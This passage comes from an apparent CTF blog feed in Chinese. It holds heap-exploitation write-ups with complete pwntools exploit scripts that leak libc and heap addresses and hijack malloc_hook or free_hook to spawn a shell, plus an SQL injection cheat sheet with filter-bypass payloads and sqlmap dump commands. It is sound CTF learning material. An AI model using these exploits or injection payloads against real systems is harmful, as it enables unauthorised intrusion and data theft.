remote(&apos;111.198.29.45&apos;,&apos;31717&apos;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;./libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;3&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def new(length,con):</span><br><span class="line">sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendline(str(length))</span><br><span class="line">sh.send(con)</span><br><span class="line"></span><br><span class="line">def edit(idx,length,con):</span><br><span class="line">        sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">        sh.sendline(str(idx))</span><br><span class="line">        sh.sendline(str(length))</span><br><span class="line">sh.send(con)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">        sh.sendlineafter(&apos;&gt;&gt; &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(0x10,&apos;a&apos;*0x10)  #0</span><br><span class="line">new(0x10,&apos;b&apos;*0x10)  #1</span><br><span class="line">new(0x10,&apos;c&apos;*0x10)  #2</span><br><span class="line">new(0x10,&apos;d&apos;*0x10)  #3</span><br><span class="line">new(0x10,&apos;e&apos;*0x10)  #4</span><br><span class="line"></span><br><span class="line">#--------------leak heap base----------------</span><br><span class="line">edit(0,0x20,&apos;a&apos;*0x18+p64(0x41))</span><br><span class="line">dele(1)</span><br><span class="line">new(0x30,&apos;b&apos;*0x18+p64(0x21)+&apos;c&apos;*0x10)  #1</span><br><span class="line">dele(4)</span><br><span class="line">dele(2)</span><br><span class="line">show(1)</span><br><span class="line">sh.recvuntil(p64(0x21))</span><br><span class="line">heap = u64(sh.recv(8))-0x80</span><br><span class="line">print &apos;heap_base: &apos;+hex(heap)</span><br><span class="line">#--------------leak libc base----------------</span><br><span class="line">new(0x10,&apos;b&apos;*0x10)  #2</span><br><span class="line">new(0x10,&apos;e&apos;*0x10)  #4</span><br><span class="line">new(0x10,&apos;f&apos;*0x10)  #5</span><br><span class="line"></span><br><span class="line">new(0x10,&apos;deadbeef&apos;*2) #6</span><br><span class="line">#new(0x90,&apos;c&apos;*0x90)</span><br><span class="line"></span><br><span class="line">edit(0,0x28,&apos;a&apos;*0x18+p64(0xa1)+&apos;a&apos;*8)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">dele(1)</span><br><span class="line">new(0x10,&apos;b&apos;*0x10)  #1</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">show(2)</span><br><span class="line">main_arena = u64(sh.recv(8))-88</span><br><span class="line">malloc_hook = main_arena - 0x10</span><br><span class="line">libc.base = malloc_hook - libc.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">one_gadget = libc.base+0x4526a</span><br><span class="line">print &apos;libc: &apos;+hex(libc.base)</span><br><span class="line">#------------hjack malloc_hook to getshell----------</span><br><span class="line">new(0x70,&apos;c&apos;*0x60+p64(0)+p64(0x31))  #2 &amp; 7</span><br><span class="line">edit(1,0x28,&apos;b&apos;*0x18+p64(0x71)+&apos;c&apos;*8)</span><br><span class="line">dele(7)</span><br><span class="line">edit(2,8,p64(main_arena-0x33))</span><br><span class="line">new(0x60,&apos;c&apos;*0x60)</span><br><span class="line">new(0x63,&apos;a&apos;*0x13+p64(one_gadget)+p64(0)*9)</span><br><span class="line">new(1,&apos;a&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Sql Injection</title>
      <link href="/2019/04/01/sql-injection/"/>
      <url>/2019/04/01/sql-injection/</url>
      <content type="html"><![CDATA[<p>#Sql Injection</p><h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><ol><li>注释： </li></ol><ul><li>–   （注意后面必须要留空格，否则无法达到注释的效果；</li><li>#</li></ul><ol start="2"><li>group_concat （连接字符串，一次性注入；</li></ol><h2 id="检测过滤字符"><a href="#检测过滤字符" class="headerlink" title="检测过滤字符"></a>检测过滤字符</h2><p>‘^(text)^’</p><p>如果text为假，那么页面就会显示正确，所以假如检测是否过滤union, 写入’^(length(union)==0)^’，如果正确就是过滤了</p><h2 id="应对过滤字符"><a href="#应对过滤字符" class="headerlink" title="应对过滤字符"></a>应对过滤字符</h2><ol start="0"><li>大小写绕过； 因为sql本身对大小写不敏感，也就是SELECT与 select本身是一致的，有的检查过松是可以通过大小写绕过的比如说 SeLEct</li><li>双写 ；因为很多情况下是将被过滤的字符替换为空，这种情况下就可以使用双写绕过，比如说 selselectect</li><li>/**/ ;</li><li>updatexml 报错注入;（最终内部细节与其他的基本一致；</li><li>concat被过滤：make_set() lpad()、reverse()、repeat()、export_set()（lpad()、reverse()、repeat()等冷门字符串处理函数</li><li>使用运算符号； 运算符进行运算的时候会先观察左右两端的数据类型是否相同，不同的话就会进行数据强制的转换；所以如果知道是字符串的话，会被强制转换为0；<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from info where username=0; </span><br><span class="line">select * from info where username=&apos;admin&apos;-0-&apos;&apos;; --&gt;减法</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* table: </span><br><span class="line">select * from info where id=-1 and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) ;  --&gt; updatexml 三个参数，不随表行数变化。</span><br></pre></td></tr></table></figure><h2 id="mysql-约束攻击"><a href="#mysql-约束攻击" class="headerlink" title="mysql 约束攻击"></a>mysql 约束攻击</h2><p>由于mysql对于字符串验证不严格，因而在检验时，’admin’与’admin   ‘被认为是等价的，也就是说可以使非管理员用户以管理员身份读取数据库信息</p><p>## </p><h3 id="database"><a href="#database" class="headerlink" title="database"></a>database</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select database();</span><br></pre></td></tr></table></figure><h3 id="table"><a href="#table" class="headerlink" title="table"></a>table</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from info where id=-1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database();</span><br></pre></td></tr></table></figure><h3 id="column"><a href="#column" class="headerlink" title="column"></a>column</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from info where id=-1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;info&apos;;</span><br></pre></td></tr></table></figure><h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>-r + ‘filename’<br>-p + ‘sqlinjection_name’   –dbs<br>-D + ‘database_name’  –tables<br>-T + ‘table_name’     –columns<br>-C + ‘column_name’    –dump</p>]]></content>
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn practice</title>
      <link href="/2019/03/29/pwn-practice/"/>
      <url>/2019/03/29/pwn-practice/</url>
      <content type="html"><![CDATA[<h1 id="fheap"><a href="#fheap" class="headerlink" title="fheap"></a>fheap</h1><p>来源：<a href="https://github.com/zh-explorer/hctf2016-fheap/blob/master/main.c" target="_blank" rel="noopener">https://github.com/zh-explorer/hctf2016-fheap/blob/master/main.c</a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>只有两个功能：add delete</p><p>add 初始时会分配一个struct，然后会分两种情况： </p><ol><li>长度小于16时，不再申请新的chunk，原结构体的前十六个字节用于接收用户输入； </li><li>长度大于16时，会申请一个新的chunk，用于存放data，此时原结构体的前八个字节存放着指向新chunk的指针。</li></ol><p>原结构体的最后十六个字节，会分别存放size 及 对应的 free函数</p><p>这里可以看到输入的size没有任何卵用，后面还是根据输入的长度来确定的。</p><p>delete 会检查存放在bss段的指针，指针存在就可以释放</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>delete 函数有明显的漏洞，之前本来设置了inuse位，但是并没有检查，同时指针仅仅是free而没有置为空，所以可以double free;</p><p>还有问题就是指针同时存放在堆中，一般而言，这样很容易造成劫持；</p><p>不过这次没有show函数，也就是说，没有办法直接通过输出泄露地址，这样一般就需要劫持指针或者是最低位修改；</p><p>而且这次有个问题就是或许是因为没有设置缓冲区的原因，前面输入的chunk data在后面新建chunk会直接赋值过去，这样子造成如果初始时分配大的chunk,后面就没办法分配到小chunk了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos; ,&apos;-c&apos;]</span><br><span class="line">name = &apos;./pwnf&apos;</span><br><span class="line">p = process(name)</span><br><span class="line">elf= ELF(name)</span><br><span class="line"></span><br><span class="line"># puts_offset = 0xd1a </span><br><span class="line"># printf_pffset = 0xdbb</span><br><span class="line">def create(num,data):</span><br><span class="line">    p.recvuntil(&apos;3.quit\n&apos;)</span><br><span class="line">    p.sendline(&apos;create &apos;)</span><br><span class="line">    p.recvuntil(&apos;Pls give string size:&apos;)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(&apos;str:&apos;)</span><br><span class="line">    p.send(data)</span><br><span class="line">    </span><br><span class="line">def delete(num):</span><br><span class="line">    p.recvuntil(&apos;3.quit\n&apos;)</span><br><span class="line">    p.sendline(&apos;delete &apos;)</span><br><span class="line">    p.recvuntil(&apos;id:&apos;)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(&apos;Are you sure?:&apos;)</span><br><span class="line">    p.send(&quot;yes&quot;)</span><br><span class="line">   </span><br><span class="line">create(5,&apos;a&apos;*5)     #0</span><br><span class="line">create(5,&apos;b&apos;*5)     #1</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">#leak</span><br><span class="line">pay1 = &apos;q&apos;*20 + &apos;s&apos;*4 + &apos;\x1a&apos;</span><br><span class="line">create(32,pay1)</span><br><span class="line">delete(1)</span><br><span class="line">p.recvuntil(&apos;s&apos;*4)</span><br><span class="line">puts_addr = u64(p.recv(6) + &apos;\x00\x00&apos;)</span><br><span class="line">proc_base = puts_addr - 0xd1a </span><br><span class="line">printf_addr = proc_base + 0x9d0</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">pay2 = &apos;a&apos;*8 + &apos;%30$p&apos; + &apos;s&apos;*11 + p64(printf_addr) </span><br><span class="line">create(32,pay2)</span><br><span class="line">delete(1)</span><br><span class="line">x = p.recv()</span><br><span class="line">libc_addr = int(x[8:22],16) - 0x3b5760</span><br><span class="line">system_addr = libc_addr + 0x42510</span><br><span class="line"></span><br><span class="line">#getshell</span><br><span class="line">p.sendline(&apos;&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">pay3 = &apos;/bin/sh;&apos; + &apos;s&apos;*16 + p64(system_addr) </span><br><span class="line">create(32,pay3)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p>ex师傅给的题，说是西湖论剑的一道题目，题目质量还是可以的，写一下。</p><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>正常的堆，四个功能齐全，漏洞点也比较明显（虽然第一次被我直接跳过了。。）。在add的时候使用了自己的get_str函数,将最末尾置为了0，<br>也就是最近经常见到的off-by-null，不过就是这次分配时大小是固定的且libc为2.27，所以多了一些技巧性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall get_str(_BYTE *a1, int size)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; // rax</span><br><span class="line">  int v3; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v3 = 0;</span><br><span class="line">  if ( size )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      read(0, &amp;a1[v3], 1uLL);</span><br><span class="line">      if ( v3 &gt; size - 1 || !a1[v3] || a1[v3] == &apos;\n&apos; )</span><br><span class="line">        break;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    a1[v3] = 0;</span><br><span class="line">    result = &amp;a1[size];</span><br><span class="line">    *result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result = a1;</span><br><span class="line">    *a1 = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>tcache机制需要绕过，同时也带来了一些便利，比如分配时不检查size<br>思路：</p><ol><li>绕过tcache，利用unsorted bin中残留的信息泄露libc</li><li>利用tcache， 根据其中残留的信息泄露heap</li><li>利用off-by-null，改变inuse位，伪造fake chunk触发unlink实现chunk extend</li><li>将重叠的堆块重新置入tcache中，修改fd到free_hook修改为one_gadget getshell</li></ol><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;xihu&apos;)</span><br><span class="line">elf = ELF(&apos;xihu&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;xihu&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,con):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;size:\n&apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;content:\n&apos;,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,con):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line">        sh.sendafter(&apos;content:\n&apos;,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    add(0xf7,str(i)*0x20)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">#----------------unsorted bin leak libc-------------------------------# </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0xf8,&apos;&apos;)#0</span><br><span class="line">for i in range(1,7):</span><br><span class="line">    add(0xf7,str(i)) #1-6</span><br><span class="line"></span><br><span class="line">add(0xf7, &apos;7&apos;) #7</span><br><span class="line">edit(7, &apos;a&apos; *  8)</span><br><span class="line">show(7)</span><br><span class="line">sh.recvuntil(&apos;a&apos;*8)</span><br><span class="line">libc_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;)) - 0x3ebca0</span><br><span class="line">print &quot;libc: &quot;+hex(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">one_gadget = libc_base + 0x4f322</span><br><span class="line"></span><br><span class="line">#---------------tcache leak heap -------------------------------------# </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">edit(0,&apos;0&apos;)</span><br><span class="line">show(0)</span><br><span class="line">heap_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))-0x730</span><br><span class="line">print hex(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#------fake chunk unlink #---chunk extend cover fd ptr--------------#</span><br><span class="line"></span><br><span class="line">chunk0_addr = heap_base + 0x850</span><br><span class="line">fake_chunk = chunk0_addr + 0x10</span><br><span class="line"></span><br><span class="line">pay = p64(0)+p64(0xf0)+p64(fake_chunk)+p64(fake_chunk)+&apos;a&apos;*0xd0+p64(0xf0)</span><br><span class="line"></span><br><span class="line">edit(0,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(8)</span><br><span class="line"></span><br><span class="line">for i in range(1,7):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">dele(7)</span><br><span class="line"></span><br><span class="line">for i in range(1,8):</span><br><span class="line">    add(0xf7,str(i))</span><br><span class="line"></span><br><span class="line">add(0xf7,&apos;8&apos;)</span><br><span class="line">dele(2)</span><br><span class="line">dele(8)</span><br><span class="line">pay = p64(0)+p64(0x101)+p64(free_hook)</span><br><span class="line">edit(0,pay)</span><br><span class="line"></span><br><span class="line">add(0,&apos;&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0xf7,&apos;&apos;)</span><br><span class="line">edit(8,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>0ctf-2019-pwn&amp;re</title>
      <link href="/2019/03/26/0ctf-2019-pwn-re/"/>
      <url>/2019/03/26/0ctf-2019-pwn-re/</url>
      <content type="html"><![CDATA[<p><em>这次的0ctf真的溃不成军，看了一些题心态爆炸</em></p><h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>还是和前两年一个风格，不过将2018的漏洞去掉了，在update时会有一个字节的溢出，溢出内容不可控，只能是’\x00’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall get_str2(__int64 des, unsigned __int64 size)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+10h] [rbp-10h]</span><br><span class="line">  ssize_t v4; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( !size )</span><br><span class="line">    return 0LL;</span><br><span class="line">  v3 = 0LL;</span><br><span class="line">  while ( v3 &lt; size )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = read(0, (void *)(v3 + des), size - v3);</span><br><span class="line">    if ( v4 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 += v4;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( *__errno_location() != 11 &amp;&amp; *__errno_location() != 4 )</span><br><span class="line">    &#123;</span><br><span class="line">      break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(des + v3) = 0;          --&gt;   here</span><br><span class="line">  return v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>当时只发现了这个漏洞，尝试了一会，当时想可能是需要把tcache填满或者把topchunk的size给消耗完(因为这次的size看上去比较小，有耗光的可能)，但是没有思路在于假如将topchunk size消耗完有什么用。遂放弃。</p><p>今天有wp出来了，出乎意料的，漏洞点确实只有这一个且前面的想法都差不多没有跑偏，但是后面缺少的的思路才是重点。</p><p>前面通过将size耗光，此时再申请时会触发consolidate，同时将之前fastbins中的的chunk归入unsorted bin,这样就有了泄露libc的机会， 通过trigger consolidation 的操作使得unsorted bin刚好覆盖到未free的chunk上，以此来泄露libc，同时也因此拥有了相当于任意地址写的机会。</p><p>同时利用此漏洞将size放入fastbin中，将chunk分配到main_arena处修改topchunk地址到malloc_hook上修改即可</p><p>问题有：</p><ol><li>申请chunk tcache与unsorted bin 的优先度？</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&quot;./babyheap&quot;)</span><br><span class="line">#sh = remote(&quot;111.186.63.20&quot;,&quot;10001&quot;)</span><br><span class="line">elf = ELF(&apos;./babyheap&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.27.so&apos;)#(&apos;libc-2.28.so&apos;)</span><br><span class="line"></span><br><span class="line">def allocate(size):</span><br><span class="line">sh.sendlineafter(&apos;Command: &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line"></span><br><span class="line">def update(idx,size,con):</span><br><span class="line">        sh.sendlineafter(&apos;Command: &apos;,&apos;2&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;Index: &apos;,str(idx))</span><br><span class="line">        sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span 